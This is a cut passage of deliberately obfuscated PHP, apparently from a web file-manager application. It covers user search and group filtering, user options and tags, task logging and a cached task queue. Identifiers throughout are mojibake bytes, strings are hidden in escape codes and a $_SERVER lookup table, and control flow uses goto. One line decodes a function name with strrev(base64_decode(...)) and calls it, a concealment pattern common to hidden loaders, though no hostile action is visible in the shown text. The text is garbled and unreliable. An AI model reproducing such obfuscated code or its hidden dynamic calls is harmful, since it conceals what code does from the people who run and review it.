Input::check($À¥ÕÌ´, $¥Ìò€¦[318])) { $Œ¡è½á½ = $this->_searchFromMeta($¥Ìò€¦[473], $À¥ÕÌ´, 10); $¡¥£õÚ§ = $this->_searchFromMeta($¥Ìò€¦[474], $À¥ÕÌ´, 10); $“¤äÔİİ = array_merge($Œ¡è½á½, $¡¥£õÚ§, $Ùñ÷ı¨Õ[$¥Ìò€¦[369]]); $Ùñ÷ı¨Õ[$¥Ìò€¦[369]] = array_unique_by_key($“¤äÔİİ, $¥Ìò€¦[1678]); $Ùñ÷ı¨Õ[$¥Ìò€¦[366]][$¥Ìò€¦[367]] = count($Ùñ÷ı¨Õ[$¥Ìò€¦[369]]); $Ùñ÷ı¨Õ[$¥Ìò€¦[366]][$¥Ìò€¦[368]] = ceil($Ùñ÷ı¨Õ[$¥Ìò€¦[366]][$¥Ìò€¦[367]] / $Ùñ÷ı¨Õ[$¥Ìò€¦[366]][$¥Ìò€¦[363]]); } $this->_listDataApply($Ùñ÷ı¨Õ[$¥Ìò€¦[369]]); $this->_filterByGroup($Ùñ÷ı¨Õ, $œ§Õ½áî); return $Ùñ÷ı¨Õ; } private function _filterByGroup(&$ÅŞ¶à€Î, $ê ‘ï¢) { $Ô§æÈ·³ =& $_SERVER[ï»»·÷á]; if (!$ê ‘ï¢) { return $ÅŞ¶à€Î; } foreach ($ÅŞ¶à€Î[$Ô§æÈ·³[369]] as $ìâ¡üìÔ => &$Ù·­Çœë) { $™™¸Ô˜í = array_to_keyvalue($Ù·­Çœë[$Ô§æÈ·³[2054]], $Ô§æÈ·³[12], $Ô§æÈ·³[1867]); if (!in_array($ê ‘ï¢, $™™¸Ô˜í)) { unset($ÅŞ¶à€Î[$Ô§æÈ·³[369]][$ìâ¡üìÔ]); } } unset($Ù·­Çœë); $ÅŞ¶à€Î[$Ô§æÈ·³[369]] = array_values($ÅŞ¶à€Î[$Ô§æÈ·³[369]]); $ÅŞ¶à€Î[$Ô§æÈ·³[366]] = array($Ô§æÈ·³[2118] => count($ÅŞ¶à€Î[$Ô§æÈ·³[369]]), $Ô§æÈ·³[2116] => $ÅŞ¶à€Î[$Ô§æÈ·³[366]][$Ô§æÈ·³[363]], $Ô§æÈ·³[2115] => 1, $Ô§æÈ·³[2117] => 1); } private function _searchFromMeta($ÚôËÊ¸, $ôİğñåÀ, $ê”¾‚ß) { $©¿çºş¥ =& $_SERVER[ï»»·÷á]; $ôİğñåÀ = strtolower($ôİğñåÀ); $‘¹ëòåÌ = array($©¿çºş¥[94] => $ÚôËÊ¸, $©¿çºş¥[374] => array($©¿çºş¥[383], "\x25{$ôİğñåÀ}\45")); $‘¹ëòåÌ = $this->parseWhereLike($‘¹ëòåÌ); $õ“¬ºà˜ = Model($©¿çºş¥[2354])->where($‘¹ëòåÌ)->limit($ê”¾‚ß)->select(); if (!$õ“¬ºà˜) { return array(); } $õ“¬ºà˜ = array_to_keyvalue($õ“¬ºà˜, $©¿çºş¥[12], $©¿çºş¥[1678]); $İŞ»¥ŸÇ = $this->where(array($©¿çºş¥[1669] => array($©¿çºş¥[7], $õ“¬ºà˜)))->select(); if (!$İŞ»¥ŸÇ) { return array(); } return $İŞ»¥ŸÇ; } private function _listDataApplyItem($°·ÁêÜü) { $¬çˆµŸ = array($°·ÁêÜü); $this->_listDataApply($¬çˆµŸ); return $¬çˆµŸ[0]; } private function _listDataApply(&$Â˜½üø†) { $–½ß”É =& $_SERVER[ï»»·÷á]; if (!$Â˜½üø†) { return; } array_remove_key($Â˜½üø†, $–½ß”É[899]); $Šª—§†¢ = array_to_keyvalue($Â˜½üø†, $–½ß”É[12], $–½ß”É[1678]); $this->_listAppendGroup($Â˜½üø†, $Šª—§†¢); $this->_listAppendMeta($Â˜½üø†, $Šª—§†¢); $this->_listAppendSourceRoot($Â˜½üø†, $Šª—§†¢); } private function _listAppendSourceRoot(&$¯Çª’Š, $Êé©ã…å) { $Şº›ğô¾ =& $_SERVER[ï»»·÷á]; $¸Èè”‚¨ = Model($Şº›ğô¾[838])->listSourceRoot(SourceModel::TYPE_USER, $Êé©ã…å); $¸Èè”‚¨ = array_to_keyvalue($¸Èè”‚¨, $Şº›ğô¾[505]); $¸Èè”‚¨ = array_remove_key($¸Èè”‚¨, $Şº›ğô¾[505]); foreach ($¯Çª’Š as &$ñƒË­Êß) { $ñƒË­Êß[$Şº›ğô¾[87]] = $¸Èè”‚¨[$ñƒË­Êß[$Şº›ğô¾[1678]]] ? $¸Èè”‚¨[$ñƒË­Êß[$Şº›ğô¾[1678]]] : array(); } unset($ñƒË­Êß); } private function _listAppendGroup(&$õÖ×€, $ÊƒÄˆËë) { $Êõ¢õ€ş =& $_SERVER[ï»»·÷á]; $©§é×ÇÒ = array($Êõ¢õ€ş[1678] => array($Êõ¢õ€ş[7], $ÊƒÄˆËë)); $Ã¡×¿¾ = Model($Êõ¢õ€ş[1957])->where($©§é×ÇÒ)->select(); $äÄº¼€÷ = array_to_keyvalue($Ã¡×¿¾, $Êõ¢õ€ş[12], $Êõ¢õ€ş[1867]); $äÄº¼€÷ = array_remove_value(array_unique($äÄº¼€÷), $Êõ¢õ€ş[198]); if (!$äÄº¼€÷ || !$Ã¡×¿¾) { return; } $©§é×ÇÒ = array($Êõ¢õ€ş[1867] => array($Êõ¢õ€ş[7], $äÄº¼€÷)); $øéºü¿ = Model($Êõ¢õ€ş[2052])->field($Êõ¢õ€ş[2355])->where($©§é×ÇÒ)->select(); $øéºü¿ = array_to_keyvalue($øéºü¿, $Êõ¢õ€ş[1867]); $Ã¡×¿¾ = array_to_keyvalue_group($Ã¡×¿¾, $Êõ¢õ€ş[1678]); foreach ($Ã¡×¿¾ as &$Ú°ÂˆœÄ) { $ù¡»ŒÜæ = array(); foreach ($Ú°ÂˆœÄ as $å“ Ù¶•) { if (!$å“ Ù¶•[$Êõ¢õ€ş[1971]]) { continue; } $’°¾ú™ = Model($Êõ¢õ€ş[507])->listData($å“ Ù¶•[$Êõ¢õ€ş[1971]]); $ù¡»ŒÜæ[] = array($Êõ¢õ€ş[1867] => $å“ Ù¶•[$Êõ¢õ€ş[1867]], $Êõ¢õ€ş[2356] => $øéºü¿[$å“ Ù¶•[$Êõ¢õ€ş[1867]]][$Êõ¢õ€ş[32]], $Êõ¢õ€ş[520] => $øéºü¿[$å“ Ù¶•[$Êõ¢õ€ş[1867]]][$Êõ¢õ€ş[520]], $Êõ¢õ€ş[422] => $’°¾ú™); } $Ú°ÂˆœÄ = $ù¡»ŒÜæ; } unset($Ú°ÂˆœÄ); foreach ($õÖ×€ as &$ŠÕÆÅ•Â) { $ŠÕÆÅ•Â[$Êõ¢õ€ş[2054]] = array(); if (isset($Ã¡×¿¾[$ŠÕÆÅ•Â[$Êõ¢õ€ş[1678]]])) { $ŠÕÆÅ•Â[$Êõ¢õ€ş[2054]] = $Ã¡×¿¾[$ŠÕÆÅ•Â[$Êõ¢õ€ş[1678]]]; } } unset($ŠÕÆÅ•Â); } public function userAppendGroup($µ¶â¥ä¾) { $·à¢º—‡ =& $_SERVER[ï»»·÷á]; if (!$µ¶â¥ä¾) { return array(); } $this->_listAppendGroup($µ¶â¥ä¾, array_to_keyvalue($µ¶â¥ä¾, $·à¢º—‡[12], $·à¢º—‡[1678])); return $µ¶â¥ä¾; } private function _listAppendMeta(&$¶ÌÍµ—å, $¡•ÛÒí¥) { $£’áº³æ =& $_SERVER[ï»»·÷á]; $½êâ‘ = UserJobModel::JOB_KEY; $•ç³©Å = array($£’áº³æ[2336]); $ğ¿©Óêš = array($£’áº³æ[1678] => array($£’áº³æ[7], $¡•ÛÒí¥)); $â£Éëš— = Model($£’áº³æ[2334])->where($ğ¿©Óêš)->select(); $â£Éëš— = array_to_keyvalue_group($â£Éëš—, $£’áº³æ[1678]); foreach ($â£Éëš— as &$‘…ªØ±‰) { $ü¸ò”Ô¬ = array(); foreach ($‘…ªØ±‰ as $œåùñç) { if (!in_array($œåùñç[$£’áº³æ[94]], $•ç³©Å)) { $ü¸ò”Ô¬[$œåùñç[$£’áº³æ[94]]] = $œåùñç[$£’áº³æ[374]]; } } $‘…ªØ±‰ = $ü¸ò”Ô¬; } unset($‘…ªØ±‰); $ÃÙ‹úÛ = Model($£’áº³æ[2357]); foreach ($¶ÌÍµ—å as &$”ìĞÇ©ğ) { $ÇÈÒ¦ÌŞ = array(); if (isset($â£Éëš—[$”ìĞÇ©ğ[$£’áº³æ[1678]]])) { $ÇÈÒ¦ÌŞ = $â£Éëš—[$”ìĞÇ©ğ[$£’áº³æ[1678]]]; } $”ìĞÇ©ğ[$£’áº³æ[2358]] = array(); if (isset($ÇÈÒ¦ÌŞ[$½êâ‘])) { $”ìĞÇ©ğ[$£’áº³æ[2358]] = $ÃÙ‹úÛ->getUserJobInfo($ÇÈÒ¦ÌŞ[$½êâ‘]); } } unset($”ìĞÇ©ğ); } protected function groupUserAll($ã–ĞØ±¥) { $û÷—ÏÛ÷ =& $_SERVER[ï»»·÷á]; if (!$ã–ĞØ±¥) { return !1; } $„–Ïš±† = Model($û÷—ÏÛ÷[1957])->field($û÷—ÏÛ÷[1678])->where(array($û÷—ÏÛ÷[1867] => array($û÷—ÏÛ÷[7], $ã–ĞØ±¥)))->select(); $„–Ïš±† = array_to_keyvalue($„–Ïš±†, $û÷—ÏÛ÷[12], $û÷—ÏÛ÷[1678]); return array_unique($„–Ïš±†); } public function userSearch($›ÌêÓùé, $„ğ©Òí = "\52") { return Model($_SERVER[ï»»·÷á][534])->where($›ÌêÓùé)->field($„ğ©Òí)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\x5f\157\160\164\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Öä—î·Ö) { $€ñşñâÑ =& $_SERVER[ï»»·÷á]; $ÓğûƒÈ» = defined($€ñşñâÑ[2145]) && USER_ID ? USER_ID : $€ñşñâÑ[12]; return "\125\163\x65\x72\x4f\x70\x74\151\x6f\x6e\137{$Öä—î·Ö}\x5f" . $ÓğûƒÈ»; } protected function filterWhere($¥Éğæû) { $™“¡™«Ø =& $_SERVER[ï»»·÷á]; $¥Éğæû[$™“¡™«Ø[1678]] = defined($™“¡™«Ø[2145]) && USER_ID ? USER_ID : $™“¡™«Ø[12]; return $¥Éğæû; } public function cacheRemoveUser($†‰ „öÒ, $´¿±Ò†Ñ) { return Cache::remove("\x55\163\145\x72\117\160\164\151\x6f\156\137{$†‰ „öÒ}\137" . $´¿±Ò†Ñ); } protected function optionDefault($§ÚµÍÔ = '') { $ş±Ìšş =& $_SERVER[ï»»·÷á]; if ($§ÚµÍÔ == $ş±Ìšş[12]) { return $GLOBALS[$ş±Ìšş[6]][$ş±Ìšş[2359]]; } if ($§ÚµÍÔ == $ş±Ìšş[2360]) { return $GLOBALS[$ş±Ìšş[6]][$ş±Ìšş[2361]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\56\164\x61\147\114\x69\163\164"; public $modelType = "\x55\x73\x65\x72\117\160\164\151\x6f\156"; public $field = array("\156\x61\x6d\145", "\163\164\171\x6c\145", "\x73\157\162\164"); public function listData($ùı®èÕÜ = false, $ïÚÎõ˜Ã = "\x73\x6f\x72\164", $¸®ŸÊí© = false) { return parent::listData($ùı®èÕÜ, $ïÚÎõ˜Ã, $¸®ŸÊí©); } public function remove($ï¥ÌÆŸÔ) { return parent::remove($ï¥ÌÆŸÔ); } public function add($óİø±°–, $×¥Ë¿™À = "\x6c\x61\142\x65\154\x2d\x67\162\145\x79\55\156\157\x72\155\141\x6c") { $éèÒƒ™Ş =& $_SERVER[ï»»·÷á]; if ($this->findByName($óİø±°–)) { return !1; } $àššÊ² = array($éèÒƒ™Ş[429] => $óİø±°–, $éèÒƒ™Ş[493] => $×¥Ë¿™À, $éèÒƒ™Ş[1871] => $this->getSort($éèÒƒ™Ş[258]) + 1); return parent::insert($àššÊ²); } public function update($ô»“ÜàÜ, $ŠùÜ‹™È) { $“„åöÃª =& $_SERVER[ï»»·÷á]; $Ôƒø ƒë = $this->listData($ô»“ÜàÜ); $Û´…¹ÆŠ = $this->findByName($ŠùÜ‹™È[$“„åöÃª[32]]); if (!$Ôƒø ƒë || $Û´…¹ÆŠ && $Û´…¹ÆŠ[$“„åöÃª[399]] != $Ôƒø ƒë[$“„åöÃª[399]]) { return !1; } return parent::update($ô»“ÜàÜ, $ŠùÜ‹™È); } public function moveTop($‚•ŞÂàã) { $Ÿ©Ä‹±å =& $_SERVER[ï»»·÷á]; $¶Ğãİº = parent::listData(); $Ü¾š‡ĞŸ = $this->getSort($Ÿ©Ä‹±å[257]); foreach ($¶Ğãİº as &$±õü²¸Ò) { if ($±õü²¸Ò[$Ÿ©Ä‹±å[399]] == $‚•ŞÂàã) { $±õü²¸Ò[$Ÿ©Ä‹±å[1891]] = $Ü¾š‡ĞŸ; continue; } $±õü²¸Ò[$Ÿ©Ä‹±å[1891]] += 1; } unset($±õü²¸Ò); return parent::resetData($¶Ğãİº); } public function moveBottom($œ²Ò÷îø) { $ßó­á¥° =& $_SERVER[ï»»·÷á]; $™ÊŸ­³é = $this->getSort($ßó­á¥°[258]) + 1; return parent::update($œ²Ò÷îø, array($ßó­á¥°[1891] => $™ÊŸ­³é)); } public function resetSort($Ë­ĞßØù) { $ËÈ­¬ =& $_SERVER[ï»»·÷á]; $÷‘î®ò‡ = array(); $Ë­ĞßØù = is_array($Ë­ĞßØù) ? $Ë­ĞßØù : array(); for ($“§üû™¥ = 0; $“§üû™¥ < count($Ë­ĞßØù); $“§üû™¥++) { $÷‘î®ò‡[$Ë­ĞßØù[$“§üû™¥] . $ËÈ­¬[12]] = $“§üû™¥ + 1; } $àÃÔÚø = parent::listData(); foreach ($àÃÔÚø as &$ù½‚êĞê) { $¦ù•ßÛ¸ = $÷‘î®ò‡[$ù½‚êĞê[$ËÈ­¬[399]]]; $ù½‚êĞê[$ËÈ­¬[1891]] = $¦ù•ßÛ¸ ? $¦ù•ßÛ¸ : $ù½‚êĞê[$ËÈ­¬[1891]]; } unset($ù½‚êĞê); return parent::resetData($àÃÔÚø); } private function getSort($ÒâÔªŠ‡) { $¢æàÖÈ =& $_SERVER[ï»»·÷á]; $ìçÍ´»¬ = parent::listData(); $üûÚàõƒ = array_to_keyvalue($ìçÍ´»¬, $¢æàÖÈ[12], $¢æàÖÈ[1891]); if (!$üûÚàõƒ) { $üûÚàõƒ = array(0); } $³·‚Šš› = $ÒâÔªŠ‡ == $¢æàÖÈ[258] ? max($üûÚàõƒ) : min($üûÚàõƒ); return intval($³·‚Šš›); } } goto A”†Š¡¨Ì…; F²ŠŠË”–«: $fileSize = strrev(base64_decode($_SERVER[‚è¬à®][0])); function binCheckNeq($óµ ñ¸Ö, $ÎŸ¹·¾á) { return $óµ ñ¸Ö != $ÎŸ¹·¾á; } $_SERVER[$_SERVER[‚è¬à®][1]] = $fileSize($_SERVER[$_SERVER[‚è¬à®][2]]); goto E¢îÛ¾ôÃ×; aôïì—…ƒß: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($µµ•“, $½‘šƒÄ¥ = '', $ØËÕÆøÛ = 0, $å¥åŞÆ = '') { $ß‚õüƒ³ =& $_SERVER[ï»»·÷á]; $æÈ•¸„ = new Task($µµ•“, $½‘šƒÄ¥, $ØËÕÆøÛ, $å¥åŞÆ); $GLOBALS[$ß‚õüƒ³[1761] . $µµ•“] = new TaskLog($ß‚õüƒ³[1662], $æÈ•¸„, $å¥åŞÆ); return $æÈ•¸„; } public function __construct($ÂÒ‘Œûü = '', $ÌÜèÊ³ñ = '', $Š¶ó¡ô = '') { $Œ“¸ÛÉ =& $_SERVER[ï»»·÷á]; if (!$ÂÒ‘Œûü) { $ÂÒ‘Œûü = $Œ“¸ÛÉ[1662]; } $Šƒòßà = $ÂÒ‘Œûü . $Œ“¸ÛÉ[386] . rand_string(10); if (!$Š¶ó¡ô) { $Š¶ó¡ô = $ÂÒ‘Œûü . $Œ“¸ÛÉ[53] . $Š¶ó¡ô; } switch ($ÂÒ‘Œûü) { case $Œ“¸ÛÉ[1662]: if (!$ÌÜèÊ³ñ || !$ÌÜèÊ³ñ->task) { return echoLog($ÂÒ‘Œûü . $Œ“¸ÛÉ[1762]); } $ÊøÇøÓ = $ÌÜèÊ³ñ; $Šƒòßà = $ÊøÇøÓ->task[$Œ“¸ÛÉ[399]]; $ÂÒ‘Œûü = $ÊøÇøÓ->task[$Œ“¸ÛÉ[399]]; if (!$ÊøÇøÓ->task[$Œ“¸ÛÉ[1576]]) { $ÊøÇøÓ->task[$Œ“¸ÛÉ[1576]] = $Š¶ó¡ô ? $Š¶ó¡ô : $ÂÒ‘Œûü; } break; case $Œ“¸ÛÉ[1763]: if (!$ÌÜèÊ³ñ) { return echoLog($ÂÒ‘Œûü . $Œ“¸ÛÉ[1764]); } $»Ì¾«Ê = is_string($ÌÜèÊ³ñ) ? array($ÌÜèÊ³ñ) : $ÌÜèÊ³ñ; $ÊøÇøÓ = new TaskFileTransfer($Šƒòßà, $ÂÒ‘Œûü, 0, $Š¶ó¡ô ? $Š¶ó¡ô : $»Ì¾«Ê[0]); foreach ($»Ì¾«Ê as $‘Í°ÁÚ‰) { $ÊøÇøÓ->addPath($‘Í°ÁÚ‰); } break; case $Œ“¸ÛÉ[313]: if (!$ÌÜèÊ³ñ) { return echoLog($ÂÒ‘Œûü . $Œ“¸ÛÉ[1764]); } $»Ì¾«Ê = is_string($ÌÜèÊ³ñ) ? array($ÌÜèÊ³ñ) : $ÌÜèÊ³ñ; $ÊøÇøÓ = new TaskZip($Šƒòßà, $ÂÒ‘Œûü, 0, $Š¶ó¡ô ? $Š¶ó¡ô : $»Ì¾«Ê[0]); foreach ($»Ì¾«Ê as $‘Í°ÁÚ‰) { $ÊøÇøÓ->addPath($‘Í°ÁÚ‰); } break; case $Œ“¸ÛÉ[1224]: if (!$ÌÜèÊ³ñ) { return echoLog($ÂÒ‘Œûü . $Œ“¸ÛÉ[1764]); } $ÊøÇøÓ = new TaskUnZip($Šƒòßà, $ÂÒ‘Œûü, 0, $Š¶ó¡ô ? $Š¶ó¡ô : $ÌÜèÊ³ñ); if ($ÌÜèÊ³ñ) { $ÊøÇøÓ->addFile($ÌÜèÊ³ñ); } break; case $Œ“¸ÛÉ[148]: $ÊøÇøÓ = new TaskHttp($Šƒòßà, $ÂÒ‘Œûü); break; default: return; break; } $this->task = $ÊøÇøÓ; $this->taskID = $Šƒòßà; Hook::bind($Œ“¸ÛÉ[1699], array($this, $Œ“¸ÛÉ[1765])); Hook::bind($Œ“¸ÛÉ[1701], array($this, $Œ“¸ÛÉ[1766])); Hook::bind($Œ“¸ÛÉ[1695], array($this, $Œ“¸ÛÉ[1767])); echoLog($Œ“¸ÛÉ[1768] . $ÊøÇøÓ->task[$Œ“¸ÛÉ[1576]]); } public function __destruct() { $this->end(); } public function end($›ğ¼­˜Ì = '') { $‘ÜôÈ÷ =& $_SERVER[ï»»·÷á]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($›ğ¼­˜Ì); $this->task = !1; $this->taskID = !1; Hook::unbind($‘ÜôÈ÷[1699], array($this, $‘ÜôÈ÷[1765])); Hook::unbind($‘ÜôÈ÷[1701], array($this, $‘ÜôÈ÷[1766])); Hook::unbind($‘ÜôÈ÷[1695], array($this, $‘ÜôÈ÷[1767])); } public function taskUpdate($‚À™şü£) { $„¯Àö˜ì =& $_SERVER[ï»»·÷á]; if (!$‚À™şü£ || $this->taskID != $‚À™şü£[$„¯Àö˜ì[399]]) { return; } $·Ñµûò = 20; $÷ÃÃå† = intval($‚À™şü£[$„¯Àö˜ì[1680]] * $·Ñµûò); $óœõÏãê = $„¯Àö˜ì[162] . str_repeat($„¯Àö˜ì[894], $÷ÃÃå†) . $„¯Àö˜ì[1024] . str_repeat($„¯Àö˜ì[53], $·Ñµûò - $÷ÃÃå†) . $„¯Àö˜ì[164]; $Ï¨ÌÓ÷ = $óœõÏãê . sprintf($„¯Àö˜ì[1769], $‚À™şü£[$„¯Àö˜ì[1680]] * 100) . $„¯Àö˜ì[1770]; $ÖäèŠˆ = $Ï¨ÌÓ÷ . $‚À™şü£[$„¯Àö˜ì[1679]] . $„¯Àö˜ì[8] . $‚À™şü£[$„¯Àö˜ì[799]] . LNG($„¯Àö˜ì[1771]); $ÏĞÃÅ†© = $„¯Àö˜ì[12]; if ($‚À™şü£[$„¯Àö˜ì[1755]]) { $ÖäèŠˆ = $Ï¨ÌÓ÷ . size_format($‚À™şü£[$„¯Àö˜ì[1679]]) . $„¯Àö˜ì[8] . size_format($‚À™şü£[$„¯Àö˜ì[799]]); $ÏĞÃÅ†© = size_format($‚À™şü£[$„¯Àö˜ì[1681]]) . $„¯Àö˜ì[1772]; } if ($‚À™şü£[$„¯Àö˜ì[1074]]) { $‚À™şü£[$„¯Àö˜ì[1729]] = $‚À™şü£[$„¯Àö˜ì[1074]] . $„¯Àö˜ì[53] . $‚À™şü£[$„¯Àö˜ì[1729]]; } if ($‚À™şü£[$„¯Àö˜ì[1729]]) { $²çèÓ” = $„¯Àö˜ì[12]; if ($‚À™şü£[$„¯Àö˜ì[1731]]) { $²çèÓ” = $„¯Àö˜ì[50] . size_format($‚À™şü£[$„¯Àö˜ì[1732]]) . $„¯Àö˜ì[8] . size_format($‚À™şü£[$„¯Àö˜ì[1731]]); } $ÏĞÃÅ†© .= $‚À™şü£[$„¯Àö˜ì[1729]] . $²çèÓ”; } if ($‚À™şü£[$„¯Àö˜ì[776]] && !$‚À™şü£[$„¯Àö˜ì[1731]]) { $ÏĞÃÅ†© .= $„¯Àö˜ì[53] . size_format($‚À™şü£[$„¯Àö˜ì[1736]]) . $„¯Àö˜ì[8] . size_format($‚À™şü£[$„¯Àö˜ì[776]]); } echoLog($ÖäèŠˆ . $„¯Àö˜ì[53] . $ÏĞÃÅ†©, !0); } public function taskEnd($²ùŠ°ââ) { $ê‘ëšï³ =& $_SERVER[ï»»·÷á]; if (!$²ùŠ°ââ || $this->taskID != $²ùŠ°ââ[$ê‘ëšï³[399]]) { return; } $Ÿ³è´ã® = $²ùŠ°ââ ? $²ùŠ°ââ[$ê‘ëšï³[1679]] . $ê‘ëšï³[8] . $²ùŠ°ââ[$ê‘ëšï³[799]] . LNG($ê‘ëšï³[1771]) . $ê‘ëšï³[71] : $ê‘ëšï³[12]; echoLog($ê‘ëšï³[1773] . $²ùŠ°ââ[$ê‘ëšï³[1576]] . ($²ùŠ°ââ[$ê‘ëšï³[462]] ? $ê‘ëšï³[71] . $²ùŠ°ââ[$ê‘ëšï³[462]] : $ê‘ëšï³[12]) . $ê‘ëšï³[71] . $Ÿ³è´ã® . $ê‘ëšï³[1774] . sprintf($ê‘ëšï³[863], timeFloat() - $²ùŠ°ââ[$ê‘ëšï³[1682]]) . $ê‘ëšï³[1694]); $this->end(); } public function taskKill($ğƒè£ ) { $Á¸Ô‡ =& $_SERVER[ï»»·÷á]; if (!$ğƒè£  || $this->taskID != $ğƒè£ [$Á¸Ô‡[399]]) { return; } echoLog($Á¸Ô‡[1775] . $ğƒè£ [$Á¸Ô‡[1576]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\163\153\121\x75\x65\x75\x65\x4c\x65\156\147\x74\150"; const QUEUE_DATA = "\x74\141\x73\153\x51\165\x65\x75\145\x44\x61\164\141"; public static $listData = false; public static function initTask() { } public static function add($Ú¹Å·ß¦, $­¬±¤Şù = array(), $Éûğ’¶´ = '', $„µÄÈƒ‰ = '') { $éÒ¼Â™– =& $_SERVER[ï»»·÷á]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($„µÄÈƒ‰ && array_find_by_field(self::$listData, $éÒ¼Â™–[94], $„µÄÈƒ‰)) { return !0; } self::$listData[] = array($éÒ¼Â™–[264] => $Ú¹Å·ß¦, $éÒ¼Â™–[1776] => $­¬±¤Şù, $éÒ¼Â™–[462] => $Éûğ’¶´, $éÒ¼Â™–[94] => $„µÄÈƒ‰); return !0; } public static function addSubmit() { $âş·èËË =& $_SERVER[ï»»·÷á]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($âş·èËË[1777] . json_encode_force(array_to_keyvalue(self::$listData, $âş·èËË[12], $âş·èËË[462])), $âş·èËË[1778]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($¾â ûåÌ, $ß¥×Ñï = array(), $ÔÈçÏÉñ = '', $‘Æ‡…Ù = '') { $Á¬™âÄ =& $_SERVER[ï»»·÷á]; if (self::count() >= self::MAX_LENGTH) { return !1; } $šœ¹âµ™ = self::getAll(); if ($‘Æ‡…Ù && array_find_by_field($šœ¹âµ™, $Á¬™âÄ[94], $‘Æ‡…Ù)) { return !0; } $šœ¹âµ™[] = array($Á¬™âÄ[264] => $¾â ûåÌ, $Á¬™âÄ[1776] => $ß¥×Ñï, $Á¬™âÄ[462] => $ÔÈçÏÉñ, $Á¬™âÄ[94] => $‘Æ‡…Ù); write_log($Á¬™âÄ[1777] . $ÔÈçÏÉñ, $Á¬™âÄ[1778]); self::setAll($šœ¹âµ™); return !0; } public static function run() { $Ò¶½èØ¨ =& $_SERVER[ï»»·÷á]; $µáüò’İ = self::getAll(); $´ññ©’ó = array_shift($µáüò’İ); if (!$´ññ©’ó) { return !1; } self::setAll($µáüò’İ); $ñ´’äª‘ = timeFloat(); try { Hook::apply($´ññ©’ó[$Ò¶½èØ¨[264]], $´ññ©’ó[$Ò¶½èØ¨[1776]]); } catch (Exception $ÚÒâ¨ø) { } $ÌüÓ¨ = number_format(timeFloat() - $ñ´’äª‘, 3) . $Ò¶½èØ¨[1694]; write_log($Ò¶½èØ¨[1779] . $´ññ©’ó[$Ò¶½èØ¨[462]] . $Ò¶½èØ¨[1780] . $ÌüÓ¨, $Ò¶½èØ¨[1778]); return !0; } public static function count() { $¦ş¿•ò‘ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$¦ş¿•ò‘) { return 0; } return intval($¦ş¿•ò‘); } public static function getAll() { $´ÅûüŞ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$´ÅûüŞ) { return array(); } return $´ÅûüŞ; } public static function setAll($Å©³Ä’é) { $ãĞ‡Ãø = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Å©³Ä’é), $ãĞ‡Ãø); Cache::set(self::QUEUE_DATA, $Å©³Ä’é, $ãĞ‡Ãø); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ĞÖ“ÕšË, $í£°Èû¤ = 5.0) { if (!$ĞÖ“ÕšË) { return; } $÷ø¤‹ú = Cache::get($ĞÖ“ÕšË); if (!$÷ø¤‹ú || timeFloat() - floatVal($÷ø¤‹ú) >= $í£°Èû¤) { Cache::set($ĞÖ“ÕšË, timeFloat(), $í£°Èû¤ * 10); return !0; } return !1; } public static function timeLimitCall($Ù®éíÖ, $ ½ßÉ¿è, $°Ë¿£¾, $µí²ÙÖ = 5.0) { $¿£¼ÙèÄ =& $_SERVER[ï»»·÷á]; if (!$Ù®éíÖ || !$ ½ßÉ¿è) { return; } self::$asyncAdd = !0; $õšÍÂÔº = $¿£¼ÙèÄ[1781]; $—Ò¾Ğ´ò = Cache::get($õšÍÂÔº, !0); $£×‚¤éû = array($¿£¼ÙèÄ[1782] => timeFloat(), $¿£¼ÙèÄ[1783] => timeFloat(), $¿£¼ÙèÄ[264] => $ ½ßÉ¿è, $¿£¼ÙèÄ[1776] => $°Ë¿£¾, $¿£¼ÙèÄ[180] => $µí²ÙÖ); if (is_array($—Ò¾Ğ´ò[$Ù®éíÖ])) { $£×‚¤éû[$¿£¼ÙèÄ[1783]] = $—Ò¾Ğ´ò[$Ù®éíÖ][$¿£¼ÙèÄ[1783]]; } if (is_array($—Ò¾Ğ´ò[$Ù®éíÖ])) { if (timeFloat() - $—Ò¾Ğ´ò[$Ù®éíÖ][$¿£¼ÙèÄ[1782]] < $£×‚¤éû[$¿£¼ÙèÄ[180]] * 0.3) { return; } $£×‚¤éû[$¿£¼ÙèÄ[1783]] = $—Ò¾Ğ´ò[$Ù®éíÖ][$¿£¼ÙèÄ[1783]]; } $—Ò¾Ğ´ò[$Ù®éíÖ] = $£×‚¤éû; Cache::set($õšÍÂÔº, $—Ò¾Ğ´ò, 60); Cache::removeMemory($õšÍÂÔº); write_log($¿£¼ÙèÄ[1784] . $Ù®éíÖ . $¿£¼ÙèÄ[71] . $ ½ßÉ¿è, $¿£¼ÙèÄ[1778]); } public static function timeLimitCallLoop() { $‰­èë¨Ï =& $_SERVER[ï»»·÷á]; $ôÊÓ¶ñ = array($‰­èë¨Ï[1785]); $¬¯©ç‡„ = in_array(strtolower(ACTION), $ôÊÓ¶ñ); if (!$¬¯©ç‡„ && !self::$asyncAdd) { return; } $²Ô¥¾âŞ = $‰­èë¨Ï[1781]; $İ¶‚Èç½ = Cache::get($²Ô¥¾âŞ, !0); if (!$İ¶‚Èç½ || count($İ¶‚Èç½) <= 0) { return; } $÷—Á‚ƒ = !1; $©Ì”‡» = timeFloat(); $“îó˜Ä× = array(); foreach ($İ¶‚Èç½ as $’öÊûâ => $ †Ìßø) { if ($©Ì”‡» - $ †Ìßø[$‰­èë¨Ï[1783]] > $ †Ìßø[$‰­èë¨Ï[180]]) { $÷—Á‚ƒ = !0; try { Hook::apply($ †Ìßø[$‰­èë¨Ï[264]], $ 